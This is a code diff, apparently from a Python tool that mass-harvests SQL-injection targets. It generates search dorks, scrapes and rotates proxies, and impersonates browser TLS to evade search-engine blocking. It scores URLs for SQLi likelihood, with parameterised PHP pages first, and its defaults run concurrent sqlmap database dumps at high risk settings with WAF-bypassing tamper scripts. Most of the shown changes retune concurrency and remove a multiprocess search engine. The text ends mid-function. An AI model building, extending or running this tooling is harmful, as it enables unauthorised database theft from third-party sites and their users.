@@ -26,14 +26,7 @@ except ImportError:
     _SOCKS_AVAILABLE=False
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",level=logging.INFO)
 logger=logging.getLogger(__name__)
-try:
-    import resource as _res
-    _s_lim, _h_lim = _res.getrlimit(_res.RLIMIT_NOFILE)
-    if _s_lim < 65536:
-        _res.setrlimit(_res.RLIMIT_NOFILE, (min(65536, _h_lim), _h_lim))
-except Exception:
-    pass
-_THREAD_POOL=concurrent.futures.ThreadPoolExecutor(max_workers=512)
+_THREAD_POOL=concurrent.futures.ThreadPoolExecutor(max_workers=128)
 
 # ── Auto Proxy Scraper ────────────────────────────────────────────────────────
 _AUTO_PROXY_THRESHOLD = 30
@@ -58,7 +51,7 @@ async def _fetch_proxy_source(session, url: str) -> list:
         return []
 
 async def _scrape_fresh_proxies() -> list:
-    connector = aiohttp.TCPConnector(limit=250, ssl=False)
+    connector = aiohttp.TCPConnector(limit=20, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         results = await asyncio.gather(
             *[_fetch_proxy_source(session, u) for u in _PROXY_SOURCES],
@@ -81,9 +74,9 @@ DEFAULT_LEVEL     = 5
 DEFAULT_RISK      = 3
 DEFAULT_TECHNIQUE = "BEUSTQ"
 DEFAULT_TAMPER    = "space2comment,between,charencode"
-DEFAULT_THREADS   = 10   # Max sqlmap HTTP threads per target
-DEFAULT_TIMEOUT   = 50
-DEFAULT_MAX_CONC  = 24   # 24 concurrent SQLMap dumps across 12 CPU cores (<2GB RAM)
+DEFAULT_THREADS   = 5
+DEFAULT_TIMEOUT   = 420
+DEFAULT_MAX_CONC  = 5
 
 # ══════════════════════════════════════════════════════════════════════
 #   GENERATORS
@@ -897,7 +890,7 @@ def generate_exposed_dorks(keywords: list, limit: int = 2_000) -> list:
 #   URL FINDER
 # ══════════════════════════════════════════════════════════════════════
 
-_THREAD_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=512)
+_THREAD_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=128)
 
 # ── GLOBAL SHARED TCP CONNECTOR ───────────────────────────────────────────────
 # One connector shared by ALL users — reuses TCP connections instead of
@@ -909,9 +902,9 @@ def _get_connector() -> aiohttp.TCPConnector:
     global _GLOBAL_CONNECTOR
     if _GLOBAL_CONNECTOR is None or _GLOBAL_CONNECTOR.closed:
         _GLOBAL_CONNECTOR = aiohttp.TCPConnector(
-            limit=4000,          # total concurrent connections
-            limit_per_host=250,   # per-host cap
-            ttl_dns_cache=600,   # cache DNS 5 mins
+            limit=1000,          # total concurrent connections
+            limit_per_host=40,   # per-host cap
+            ttl_dns_cache=300,   # cache DNS 5 mins
             force_close=False,   # reuse keep-alive sockets
             enable_cleanup_closed=True,
         )
@@ -921,31 +914,31 @@ def _get_connector() -> aiohttp.TCPConnector:
 # Tracks consecutive empty/failed DDGS calls across threads.
 # When it hits 10, all threads sleep 45s then reset — avoids spending hours
 # hammering a rate-limited API at 500k dork scale.
-_ddgs_lock             = _threading.Lock()
-_ddgs_consecutive_fail = 0
-_ddgs_disabled_until   = 0.0
-
-def _ddgs_is_available() -> bool:
-    if not DDGS_AVAILABLE:
-        return False
-    return time.time() >= _ddgs_disabled_until
+_ddgs_lock            = _threading.Lock()
+_ddgs_consecutive_empty = 0
+_ddgs_cooldown_until  = 0.0   # epoch seconds; sleep until this time if >0
+_DDGS_EMPTY_THRESHOLD = 30    # consecutive empties before cooldown
+_DDGS_COOLDOWN_SECS   = 12    # seconds to cool down
 
 def _ddgs_record_empty():
-    global _ddgs_consecutive_fail, _ddgs_disabled_until
+    global _ddgs_consecutive_empty, _ddgs_cooldown_until
     with _ddgs_lock:
-        _ddgs_consecutive_fail += 1
-        if _ddgs_consecutive_fail >= 5:
-            _ddgs_disabled_until   = time.time() + 60.0
-            _ddgs_consecutive_fail = 0
+        _ddgs_consecutive_empty += 1
+        if _ddgs_consecutive_empty >= _DDGS_EMPTY_THRESHOLD:
+            _ddgs_cooldown_until    = time.time() + _DDGS_COOLDOWN_SECS
+            _ddgs_consecutive_empty = 0
 
 def _ddgs_record_success():
-    global _ddgs_consecutive_fail
+    global _ddgs_consecutive_empty
     with _ddgs_lock:
-        _ddgs_consecutive_fail = 0
+        _ddgs_consecutive_empty = 0
 
 def _ddgs_wait_if_coolingdown():
-    """Non-blocking: never freeze worker threads."""
-    pass
+    """Block current thread until DDGS cooldown expires."""
+    global _ddgs_cooldown_until
+    remaining = _ddgs_cooldown_until - time.time()
+    if remaining > 0:
+        time.sleep(remaining + 0.5)
 
 # ── HEADERS ───────────────────────────────────────────────────────────────────
 HEADERS_LIST = [
@@ -1372,22 +1365,31 @@ def _parse_proxy(proxy_str: str) -> str:
     return f"socks5://{proxy_str}"
 
 
-async def check_proxy_live(proxy_url: str, timeout: float = 4.5, shared_session: aiohttp.ClientSession = None) -> bool:
-    """Fast live proxy check — reuses shared 4000-socket session for HTTP/HTTPS proxies."""
+async def check_proxy_live(proxy_url: str, timeout: float = 8.0) -> bool:
+    """
+    Test whether a proxy is reachable.
+    Supports HTTP, HTTPS, SOCKS4, SOCKS5 proxies.
+    Returns True if live, False if dead/unreachable.
+    """
     if not proxy_url:
         return False
+
     is_socks = proxy_url.startswith(("socks5://", "socks4://"))
+
     try:
         if is_socks and _SOCKS_AVAILABLE:
-            conn = _ProxyConnector.from_url(proxy_url, ssl=False)
-            async with aiohttp.ClientSession(connector=conn) as session:
-                async with session.get("https://www.bing.com/robots.txt", timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False) as resp:
-                    return resp.status in (200, 301, 302)
-        if shared_session is not None:
-            async with shared_session.get("https://www.bing.com/robots.txt", proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False) as resp:
-                return resp.status in (200, 301, 302)
-        async with aiohttp.ClientSession(connector=_get_connector(), connector_owner=False) as session:
-            async with session.get("https://www.bing.com/robots.txt", proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False) as resp:
+            connector = _ProxyConnector.from_url(proxy_url, ssl=False)
+        else:
+            connector = aiohttp.TCPConnector(ssl=False)
+
+        async with aiohttp.ClientSession(connector=connector) as session:
+            kwargs = dict(
+                timeout=aiohttp.ClientTimeout(total=timeout),
+                allow_redirects=False,
+            )
+            if not is_socks:
+                kwargs["proxy"] = proxy_url
+            async with session.get("https://api.ipify.org", **kwargs) as resp:
                 return resp.status in (200, 301, 302)
     except Exception:
         return False
@@ -1395,40 +1397,45 @@ async def check_proxy_live(proxy_url: str, timeout: float = 4.5, shared_session:
 
 async def check_proxies_bulk(
     proxy_list: list,
-    timeout: float = 4.5,
-    concurrency: int = 1500,
+    timeout: float = 6.0,
+    concurrency: int = 300,
     progress_callback=None,
 ) -> list:
-    """Beast-mode bulk proxy checker: 1500 concurrent checks on shared connector pool."""
+    """
+    Check a large list of proxy URLs concurrently.
+    Returns list of live proxy URLs.
+    progress_callback(checked, total, live_count) called every ~2 seconds.
+    """
     total = len(proxy_list)
     live = []
     checked = 0
     last_report = 0.0
     sem = asyncio.Semaphore(concurrency)
 
-    async with aiohttp.ClientSession(connector=_get_connector(), connector_owner=False) as shared_sess:
-        async def _check(px: str):
-            nonlocal checked, last_report
-            async with sem:
-                result = await check_proxy_live(px, timeout=timeout, shared_session=shared_sess)
-                checked += 1
-                if result:
-                    live.append(px)
-                now = time.monotonic()
-                if progress_callback and (now - last_report) >= 1.5:
-                    last_report = now
-                    try:
-                        await progress_callback(checked, total, len(live))
-                    except Exception:
-                        pass
+    async def _check(px: str):
+        nonlocal checked, last_report, live
+        async with sem:
+            result = await check_proxy_live(px, timeout=timeout)
+            checked += 1
+            if result:
+                live.append(px)
+            now = asyncio.get_event_loop().time()
+            if progress_callback and (now - last_report) >= 2.0:
+                last_report = now
+                try:
+                    await progress_callback(checked, total, len(live))
+                except Exception:
+                    pass
 
-        await asyncio.gather(*[_check(px) for px in proxy_list], return_exceptions=True)
+    await asyncio.gather(*[_check(px) for px in proxy_list], return_exceptions=True)
 
+    # Final progress report
     if progress_callback:
         try:
             await progress_callback(checked, total, len(live))
         except Exception:
             pass
+
     return live
 
 
@@ -1453,39 +1460,57 @@ def _is_captcha_page(html: str) -> bool:
 
 
 def _ddgs_search_sync(dork: str, max_results: int, proxy_list: list = None) -> list:
-    """Fast single-pass DDGS search — no thread-blocking sleeps."""
-    if not _ddgs_is_available():
+    """
+    Synchronous DDGS search — runs in thread pool.
+    Retries up to 3 times with backoff on rate-limit errors.
+    """
+    if proxy_list is None:
+        proxy_list = []
+    if not DDGS_AVAILABLE:
         return []
     cleaned = clean_dork_for_search(dork)
     if not cleaned:
         return []
 
-    proxy_url = _pick_proxy(proxy_list)
-    try:
-        if proxy_url:
-            try:
-                ddgs_obj = DDGS(proxy=proxy_url)
-            except TypeError:
+    # Wait out any active cooldown before firing
+    _ddgs_wait_if_coolingdown()
+
+    for attempt in range(3):
+        proxy_url = _pick_proxy(proxy_list)
+        try:
+            if proxy_url:
                 try:
-                    ddgs_obj = DDGS(proxies=proxy_url)
-                except Exception:
-                    ddgs_obj = DDGS()
-        else:
-            ddgs_obj = DDGS()
-        results = ddgs_obj.text(cleaned, max_results=max_results, safesearch="off")
-        urls = []
-        for r in (results or []):
-            href = r.get("href", "")
-            if href and href.startswith("http") and is_valid_url(href):
-                urls.append(href.rstrip("/"))
-        if urls:
-            _ddgs_record_success()
-            return urls
-        _ddgs_record_empty()
-        return []
-    except Exception:
-        _ddgs_record_empty()
-        return []
+                    ddgs_obj = DDGS(proxy=proxy_url)
+                except TypeError:
+                    try:
+                        ddgs_obj = DDGS(proxies=proxy_url)
+                    except Exception:
+                        ddgs_obj = DDGS()
+            else:
+                ddgs_obj = DDGS()
+            results = ddgs_obj.text(cleaned, max_results=max_results, safesearch="off")
+            urls = []
+            for r in (results or []):
+                href = r.get("href", "")
+                if href and href.startswith("http") and is_valid_url(href):
+                    urls.append(href.rstrip("/"))
+            if urls:
+                _ddgs_record_success()
+                return urls
+            # Empty result — record and short wait
+            _ddgs_record_empty()
+            time.sleep(0.5 * (attempt + 1))
+            _ddgs_wait_if_coolingdown()   # cooldown may have triggered
+        except Exception as ex:
+            msg = str(ex).lower()
+            if "ratelimit" in msg or "202" in msg or "timeout" in msg:
+                _ddgs_record_empty()
+                time.sleep(1.5 * (attempt + 1))
+                _ddgs_wait_if_coolingdown()
+            elif attempt < 2:
+                time.sleep(0.3)
+    _ddgs_record_empty()
+    return []
 
 
 def _ddgs_expand_dork(dork: str, num_variants: int = 3) -> list:
@@ -1865,7 +1890,7 @@ async def fetch_scrape(
                         async with socks_sess.get(
                             url,
                             headers=headers,
-                            timeout=aiohttp.ClientTimeout(total=15, sock_connect=2.0, sock_read=3.5),
+                            timeout=aiohttp.ClientTimeout(total=8),
                             allow_redirects=True,
                         ) as resp:
                             if resp.status == 200:
@@ -1876,7 +1901,7 @@ async def fetch_scrape(
 
                 kwargs = dict(
                     headers=headers,
-                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=2.0, sock_read=3.5),
+                    timeout=aiohttp.ClientTimeout(total=8),
                     ssl=False,
                     allow_redirects=True,
                 )
@@ -1887,9 +1912,11 @@ async def fetch_scrape(
                         html = await resp.text(errors="ignore")
                         if len(html) > 500 and not _is_captcha_page(html):
                             return engine["extractor"](html)
-                        return []
+                        await asyncio.sleep(0.1 * (attempt + 1))
+                        continue
                     elif resp.status in (429, 403, 202):
-                        return []
+                        await asyncio.sleep(0.5 * (attempt + 1))
+                        continue
                     return []
             except asyncio.TimeoutError:
                 pass
@@ -1899,642 +1926,165 @@ async def fetch_scrape(
         return []
 
 
-# ── HYPER 12-CORE MULTI-PROCESS + RUST PRIMP + 3X QUALITY SEARCH ENGINE ───────
-import multiprocessing as _mp
-
-# Silence noisy per-request INFO logging in primp / ddgs / httpx (prevents SSH PTY write stalls on 100k+ dorks!)
-for _noisy_logger in ("primp", "primp.r#async.client", "ddgs", "ddgs.ddgs", "duckduckgo_search", "httpx", "httpcore", "urllib3"):
-    logging.getLogger(_noisy_logger).setLevel(logging.ERROR)
-
-try:
-    import primp as _primp
-    _PRIMP_AVAILABLE = hasattr(_primp, "AsyncClient")
-except Exception:
-    _primp = None
-    _PRIMP_AVAILABLE = False
-
-_RAW_HREF_RE = re.compile(r"""href=["']([^"'<>\s]{10,600})["']""", re.IGNORECASE)
-_YAHOO_RU_RE = re.compile(r"""/RU=([^/"'&<>\s]+)""")
-_BING_U_RE   = re.compile(r"""[?&]u=(a1[A-Za-z0-9_\-]+=*)""")
-_DDG_UDDG_RE = re.compile(r"""[?&]uddg=([^&"'<>\s]+)""")
-
-_SKIP_SEARCH_HOSTS = (
-    "bing.com", "microsoft.com", "live.com", "msn.com",
-    "google.", "gstatic.com", "googleapis.com", "youtube.com",
-    "yahoo.com", "yimg.com", "yahoodns.net",
-    "duckduckgo.com", "brave.com", "mojeek.com", "ask.com", "yandex.",
-    "w3.org", "schema.org", "cloudflare.com",
-)
-
-
-def decode_bing_redirect(href: str) -> str:
-    """Lossless URL-safe + standard Base64 decoder for Bing `u=a1...` redirect URLs (preserves `?id=`!)."""
-    try:
-        if "bing.com/ck/a" in href or "/ck/a?" in href:
-            full = href if href.startswith("http") else "https://www.bing.com" + href
-            parsed = urlparse(full)
-            params = parse_qs(parsed.query)
-            if "u" in params:
-                u_val = params["u"][0]
-                if u_val.startswith("a1"):
-                    u_val = u_val[2:]
-                u_val = u_val.replace("-", "+").replace("_", "/")
-                rem = len(u_val) % 4
-                if rem:
-                    u_val += "=" * (4 - rem)
-                decoded = base64.b64decode(u_val).decode("utf-8", errors="ignore")
-                if decoded.startswith("http"):
-                    return decoded
-    except Exception:
-        pass
-    return href
-
-
-def _fast_extract_search_urls(html: str, engine_name: str = "") -> list:
-    """
-    C-speed regex extractor (~45x faster than BeautifulSoup on 200KB SERP pages)
-    with full Bing `u=a1...`, Yahoo `/RU=...`, and DDG `uddg=...` decoding!
-    """
-    if not html or len(html) < 400:
-        return []
-    out = []
-    seen = set()
-
-    # 1. Decode encoded Bing base64 redirect tokens (`u=a1...`) directly from HTML
-    if engine_name == "bing":
-        for tok in _BING_U_RE.findall(html):
-            u = decode_bing_redirect("https://www.bing.com/ck/a?u=" + tok)
-            if u and u.startswith("http") and u not in seen:
-                seen.add(u)
-                if is_valid_url(u) and not any(h in u.lower() for h in _SKIP_SEARCH_HOSTS):
-                    out.append(u.rstrip("/"))
-
-    # 2. Decode Yahoo `/RU=...` links directly
-    if engine_name == "yahoo":
-        for enc in _YAHOO_RU_RE.findall(html):
-            try:
-                u = unquote(enc)
-                if u.startswith("http") and u not in seen:
-                    seen.add(u)
-                    if is_valid_url(u) and not any(h in u.lower() for h in _SKIP_SEARCH_HOSTS):
-                        out.append(u.rstrip("/"))
-            except Exception:
-                pass
-
-    # 3. Decode DDG `uddg=...` links directly
-    if "ddg" in engine_name:
-        for enc in _DDG_UDDG_RE.findall(html):
-            try:
-                u = unquote(enc)
-                if u.startswith("http") and u not in seen:
-                    seen.add(u)
-                    if is_valid_url(u) and not any(h in u.lower() for h in _SKIP_SEARCH_HOSTS):
-                        out.append(u.rstrip("/"))
-            except Exception:
-                pass
-
-    # 4. Standard `href="..."` scan across all engines (catches direct links everywhere)
-    for raw_href in _RAW_HREF_RE.findall(html):
-        href = raw_href.replace("&amp;", "&").strip()
-        if href.startswith("//"):
-            href = "https:" + href
-        href = _fix_href(href)
-        if not href or not href.startswith("http") or href in seen:
-            continue
-        seen.add(href)
-        low = href.lower()
-        if any(h in low for h in _SKIP_SEARCH_HOSTS):
-            continue
-        if is_valid_url(href):
-            out.append(href.rstrip("/"))
-
-    return out
-
-
-def _make_primp_async_client(proxy_url: str = None, timeout: float = 6.0):
-    """Create a Rust HTTP/2 TLS-impersonating AsyncClient compatible with all primp versions."""
-    if not _PRIMP_AVAILABLE:
-        return None
-    for imp in ("random", "chrome", "chrome_131", None):
-        try:
-            kw = {"verify": False, "follow_redirects": True, "timeout": timeout}
-            if imp:
-                kw["impersonate"] = imp
-            if proxy_url:
-                kw["proxy"] = proxy_url
-            return _primp.AsyncClient(**kw)
-        except Exception:
-            continue
-    return None
-
-
-HYPER_ENGINES = [
-    {
-        "name": "bing",
-        "url": "https://www.bing.com/search?q={query}&first={offset}&count=30&setmkt=en-US&setlang=en",
-        "offsets": [1, 11, 21],
-        "referer": "https://www.bing.com/",
-    },
-    {
-        "name": "yahoo",
-        "url": "https://search.yahoo.com/search?p={query}&b={offset}&pz=20",
-        "offsets": [1, 21],
-        "referer": "https://search.yahoo.com/",
-    },
-    {
-        "name": "brave",
-        "url": "https://search.brave.com/search?q={query}&offset={offset}&source=web",
-        "offsets": [0, 1],
-        "referer": "https://search.brave.com/",
-    },
-    {
-        "name": "ddg_html",
-        "url": "https://html.duckduckgo.com/html/?q={query}&s={offset}",
-        "offsets": [0, 30],
-        "referer": "https://html.duckduckgo.com/",
-    },
-    {
-        "name": "mojeek",
-        "url": "https://www.mojeek.com/search?q={query}&s={offset}",
-        "offsets": [1],
-        "referer": "https://www.mojeek.com/",
-    },
-]
-
-
-async def _single_worker_async_core(
-    shard_dorks: list,
-    worker_limit: int,
-    proxy_list: list,
-    report_fn=None,
-    stop_check_fn=None,
-) -> tuple[dict, int]:
-    """
-    Runs inside EACH CPU core process independently:
-      - Rust `primp.AsyncClient` HTTP/2 Chrome TLS pool + `aiohttp` fallback
-      - Live proxy health tracking (3 strikes = auto-quarantine dead proxy!)
-      - Automatic Direct retry whenever a proxy fails (ZERO lost dorks!)
-      - Un-canceled per-dork `DDGS(max_results=100)` + 3-page Bing + 2-page Yahoo + Brave/DDG!
-      - Smart SQLi-Priority Domain Diversity (`MAX_PER_DOMAIN = 14`, `?param=` priority!)
-    """
-    found_scores: dict = {}
-    seen_norm: set = set()
-    dom_param_cnt: dict = {}
-    dom_static_cnt: dict = {}
-    MAX_PARAM_PER_DOM = 14
-    MAX_STATIC_PER_DOM = 3
-    retries = 0
-
-    healthy_proxies = list(proxy_list) if proxy_list else []
-    proxy_fails: dict = {}
-
-    def _pick_healthy_proxy() -> str:
-        if not healthy_proxies:
-            return ""
-        return random.choice(healthy_proxies)
-
-    def _record_proxy_bad(px: str):
-        if not px:
-            return
-        cnt = proxy_fails.get(px, 0) + 1
-        proxy_fails[px] = cnt
-        if cnt >= 3 and px in healthy_proxies:
-            try:
-                healthy_proxies.remove(px)
-            except ValueError:
-                pass
-
-    def _record_proxy_good(px: str):
-        if px:
-            proxy_fails[px] = 0
-
-    def _add_hq_url(url: str):
-        if len(found_scores) >= worker_limit:
-            return
-        if not is_valid_url(url):
-            return
-        norm = normalize_url(url)
-        if norm in seen_norm:
-            return
-        is_param = ("?" in url and "=" in url)
-        try:
-            dom = urlparse(url).netloc.lower().lstrip("www.")
-            if is_param:
-                if dom_param_cnt.get(dom, 0) >= MAX_PARAM_PER_DOM:
-                    return
-                dom_param_cnt[dom] = dom_param_cnt.get(dom, 0) + 1
-            else:
-                if dom_static_cnt.get(dom, 0) >= MAX_STATIC_PER_DOM:
-                    return
-                dom_static_cnt[dom] = dom_static_cnt.get(dom, 0) + 1
-        except Exception:
-            pass
-        seen_norm.add(norm)
-        found_scores[url.rstrip("/")] = url_quality_score(url)
-
-    # Persistent HTTP/2 Rust client pool (direct + cached proxy clients)
-    direct_clients = [c for c in (_make_primp_async_client(None, timeout=6.0) for _ in range(8)) if c is not None]
-    proxy_clients: dict = {}
-
-    def _get_proxy_primp(px: str):
-        c = proxy_clients.get(px)
-        if c is None and len(proxy_clients) < 96:
-            c = _make_primp_async_client(px, timeout=4.5)
-            if c is not None:
-                proxy_clients[px] = c
-        return c
-
-    aio_conn = aiohttp.TCPConnector(limit=400, limit_per_host=60, ssl=False, ttl_dns_cache=600)
-    http_sem = asyncio.Semaphore(140)
-    ddgs_pool = concurrent.futures.ThreadPoolExecutor(max_workers=48)
-    ddgs_sem = asyncio.Semaphore(40)
-    ddgs_pause_until = [0.0]
-    ddgs_rl_streak = [0]
-
-    def _ddgs_one_sync(cleaned_q: str, num_variants: int) -> list:
-        if not DDGS_AVAILABLE or time.time() < ddgs_pause_until[0]:
-            return []
-        queries = [cleaned_q]
-        if num_variants >= 2 and "site:" not in cleaned_q.lower():
-            queries.append(cleaned_q + " site:.com")
-        collected = []
-        for q_str in queries:
-            px = _pick_healthy_proxy()
-            # Try healthy proxy first (if any), then ALWAYS fall back to direct!
-            attempts = [px, ""] if px else [""]
-            for cur_px in attempts:
-                if time.time() < ddgs_pause_until[0]:
-                    break
-                try:
-                    if cur_px:
-                        try:
-                            d_obj = DDGS(proxy=cur_px, timeout=5)
-                        except TypeError:
-                            d_obj = DDGS(proxy=cur_px)
-                    else:
-                        try:
-                            d_obj = DDGS(timeout=5)
-                        except TypeError:
-                            d_obj = DDGS()
-                    try:
-                        res = d_obj.text(q_str, max_results=100, safesearch="off")
-                    except TypeError:
-                        res = d_obj.text(q_str, max_results=100)
-                    batch_u = []
-                    for r in (res or []):
-                        href = r.get("href", "") or r.get("url", "")
-                        if href and href.startswith("http") and is_valid_url(href):
-                            batch_u.append(href.rstrip("/"))
-                    if batch_u:
-                        _record_proxy_good(cur_px)
-                        ddgs_rl_streak[0] = 0
-                        collected.extend(batch_u)
-                        break
-                    if cur_px:
-                        _record_proxy_bad(cur_px)
-                except Exception as ex:
-                    if cur_px:
-                        _record_proxy_bad(cur_px)
-                    else:
-                        emsg = str(ex).lower()
-                        if "ratelimit" in emsg or "202" in emsg or "429" in emsg:
-                            ddgs_rl_streak[0] += 1
-                            if ddgs_rl_streak[0] >= 8:
-                                ddgs_pause_until[0] = time.time() + 6.0
-                                ddgs_rl_streak[0] = 0
-        return collected
-
-    async def _fetch_serp_fast(aio_sess: aiohttp.ClientSession, engine: dict, cleaned_q: str, offset: int) -> list:
-        url = engine["url"].format(query=quote_plus(cleaned_q), offset=offset)
-        headers = random.choice(HEADERS_LIST).copy()
-        headers["Referer"] = engine.get("referer", "https://www.bing.com/")
-        ename = engine["name"]
-
-        async with http_sem:
-            px = _pick_healthy_proxy()
-            attempts = [px, ""] if px else [""]
-            for cur_px in attempts:
-                # Path A: Native Rust Chrome/Firefox HTTP/2 TLS client (`primp`)
-                if direct_clients:
-                    client = _get_proxy_primp(cur_px) if cur_px else random.choice(direct_clients)
-                    if client is not None:
-                        try:
-                            resp = await client.get(url, headers=headers, timeout=5.0)
-                            if resp.status_code == 200:
-                                html = resp.text
-                                if len(html) > 500 and not _is_captcha_page(html):
-                                    urls = _fast_extract_search_urls(html, ename)
-                                    if urls:
-                                        _record_proxy_good(cur_px)
-                                        return urls
-                            elif resp.status_code in (403, 429, 503) and cur_px:
-                                _record_proxy_bad(cur_px)
-                                continue
-                            if not cur_px:
-                                return []
-                        except Exception:
-                            if cur_px:
-                                _record_proxy_bad(cur_px)
-                                continue
-                            return []
-
-                # Path B: aiohttp fallback
-                try:
-                    kw = dict(
-                        headers=headers,
-                        timeout=aiohttp.ClientTimeout(total=8.0, sock_connect=2.5, sock_read=4.0),
-                        ssl=False,
-                        allow_redirects=True,
-                    )
-                    if cur_px and not cur_px.startswith(("socks4://", "socks5://")):
-                        kw["proxy"] = cur_px
-                    async with aio_sess.get(url, **kw) as r:
-                        if r.status == 200:
-                            html = await r.text(errors="ignore")
-                            if len(html) > 500 and not _is_captcha_page(html):
-                                urls = _fast_extract_search_urls(html, ename)
-                                if urls:
-                                    _record_proxy_good(cur_px)
-                                    return urls
-                except Exception:
-                    if cur_px:
-                        _record_proxy_bad(cur_px)
-            return []
-
-    total_local = len(shard_dorks)
-    num_variants = 2 if total_local <= 600 else 1
-    done_local = [0]
-    last_rep = [0.0]
-    loop = asyncio.get_running_loop()
-    _p_dns = concurrent.futures.ThreadPoolExecutor(max_workers=128)
-    loop.set_default_executor(_p_dns)
-
-    primary_engs = HYPER_ENGINES[:2]
-    extra_engs = HYPER_ENGINES[2:]
-
-    async with aiohttp.ClientSession(connector=aio_conn) as aio_sess:
-        q = asyncio.Queue()
-        for d in shard_dorks:
-            q.put_nowait(d)
-
-        async def _dork_worker():
-            nonlocal retries
-            while not q.empty():
-                if (stop_check_fn and stop_check_fn()) or len(found_scores) >= worker_limit:
-                    break
-                try:
-                    dork = q.get_nowait()
-                except asyncio.QueueEmpty:
-                    break
-                try:
-                    cleaned = clean_dork_for_search(dork)
-                    if cleaned:
-                        tasks = []
-                        for p_eng in primary_engs:
-                            for off in p_eng["offsets"]:
-                                tasks.append(_fetch_serp_fast(aio_sess, p_eng, cleaned, off))
-                        if extra_engs:
-                            ex_eng = random.choice(extra_engs)
-                            tasks.append(_fetch_serp_fast(aio_sess, ex_eng, cleaned, ex_eng["offsets"][0]))
-                        if DDGS_AVAILABLE and time.time() >= ddgs_pause_until[0]:
-                            async def _run_ddgs_dork(cq=cleaned):
-                                async with ddgs_sem:
-                                    return await loop.run_in_executor(ddgs_pool, _ddgs_one_sync, cq, num_variants)
-                            tasks.append(_run_ddgs_dork())
-
-                        try:
-                            res_list = await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=6.5)
-                        except asyncio.TimeoutError:
-                            res_list = []
-                        got_any = False
-                        for item in res_list:
-                            if isinstance(item, list) and item:
-                                got_any = True
-                                for u in item:
-                                    _add_hq_url(u)
-                    done_local[0] += 1
-                    now = time.monotonic()
-                    if report_fn and (now - last_rep[0] >= 1.0 or done_local[0] == total_local):
-                        last_rep[0] = now
-                        report_fn(done_local[0], len(found_scores), retries)
-                except Exception:
-                    retries += 1
-                    done_local[0] += 1
-                finally:
-                    q.task_done()
-
-        n_coros = min(75, max(8, total_local))
-        await asyncio.gather(*[asyncio.create_task(_dork_worker()) for _ in range(n_coros)], return_exceptions=True)
-        if report_fn:
-            report_fn(done_local[0], len(found_scores), retries)
-
-    ddgs_pool.shutdown(wait=False, cancel_futures=True)
-    return found_scores, retries
-
-
-def _mp_worker_entry(worker_id: int, shard_dorks: list, worker_limit: int, proxy_list: list, out_path: str, prog_q, stop_val):
-    """Entry point inside forked child process (own isolated event loop + own CPU core + RAM file output!)."""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        def _rep(done_n: int, found_n: int, err_n: int):
-            try:
-                prog_q.put_nowait(("prog", worker_id, done_n, found_n, err_n))
-            except Exception:
-                pass
-
-        scores_dict, err_cnt = loop.run_until_complete(
-            _single_worker_async_core(
-                shard_dorks,
-                worker_limit,
-                proxy_list,
-                report_fn=_rep,
-                stop_check_fn=lambda: bool(stop_val.value),
-            )
-        )
-        with open(out_path, "w", encoding="utf-8") as _wf:
-            json.dump(scores_dict, _wf)
-        prog_q.put(("done", worker_id, len(scores_dict), err_cnt))
-        prog_q.close()
-        prog_q.join_thread()
-    except Exception:
-        try:
-            with open(out_path, "w", encoding="utf-8") as _wf:
-                json.dump({}, _wf)
-            prog_q.put(("done", worker_id, 0, 0))
-            prog_q.close()
-            prog_q.join_thread()
-        except Exception:
-            pass
-    os._exit(0)
-
+# ── MAIN SEARCH FUNCTION ──────────────────────────────────────────────────────
 
 async def search_urls_from_dorks(
     dorks: list,
-    limit: int = 300_000,
+    limit: int = 100_000,
     progress_callback=None,
     stop_event: asyncio.Event = None,
     proxy_list: list = None,
 ) -> list:
     """
-    True 12-Core Multi-Process + Rust Browser TLS + Full DDGS/Bing/Yahoo/Brave Search Engine:
-      - Distributes work across ALL physical CPU cores via `fork` when dorks >= 200
-      - Transfers shard results via `/dev/shm` RAM tmpfs (zero OS pipe deadlocks at any scale!)
-      - Preserves 100% SQLi URL scoring, cross-core deduplication, and domain diversity!
+    Fast dual-engine URL search:
+    1. DDGS (DuckDuckGo library) — primary, reliable, not blocked
+    2. Bing + DDG HTML scraping — secondary, async, also fast
+
+    No live-verification — search engines index only real live pages.
+    Results sorted by quality: PHP pages with params first.
     """
-    if not dorks:
-        return []
     if proxy_list is None:
         proxy_list = []
+    found_url_scores: dict = {}  # url ➪ quality score
+    seen_normalized: set = set()
+    domain_counts:   dict = {}  # domain ➪ count (diversity filter)
+    total = len(dorks)
+    retries = 0
+    last_progress_time = 0.0
+    MAX_PER_DOMAIN = 8   # max 8 URLs per domain — forces diversity across more sites
 
-    work_dorks = list(dorks)
-    random.shuffle(work_dorks)
-    total = len(work_dorks)
+    # Scale DDGS variants based on total dork count to avoid rate-limit death:
+    #   ≤ 500    ➪ 3 variants (max coverage)
+    #   ≤ 5,000  ➪ 2 variants
+    #   > 5,000  ➪ 1 variant  (500k dorks = max throughput, no waste)
+    if total <= 500:
+        _num_variants = 3
+    elif total <= 5000:
+        _num_variants = 2
+    else:
+        _num_variants = 1
 
-    if total < 200 or sys.platform != "linux":
-        scores, _ = await _single_worker_async_core(
-            work_dorks,
-            limit,
-            proxy_list,
-            report_fn=None,
-            stop_check_fn=(lambda: stop_event.is_set()) if stop_event else None,
-        )
+    random.shuffle(dorks)
+
+    def _add_url(url: str):
+        """Thread-safe URL add with domain diversity filtering."""
+        nonlocal found_url_scores, seen_normalized, domain_counts
+        if len(found_url_scores) >= limit:
+            return
+        if not is_valid_url(url):
+            return
+        norm = normalize_url(url)
+        if norm in seen_normalized:
+            return
+        # Domain diversity: max MAX_PER_DOMAIN URLs per domain
+        try:
+            domain = urlparse(url).netloc.lower().lstrip("www.")
+            if domain_counts.get(domain, 0) >= MAX_PER_DOMAIN:
+                return
+            domain_counts[domain] = domain_counts.get(domain, 0) + 1
+        except Exception:
+            pass
+        seen_normalized.add(norm)
+        score = url_quality_score(url)
+        found_url_scores[url.rstrip("/")] = score
+
+    async def _report(done: int):
+        nonlocal last_progress_time
+        now = time.monotonic()
+        if now - last_progress_time < 1.5:
+            return
+        last_progress_time = now
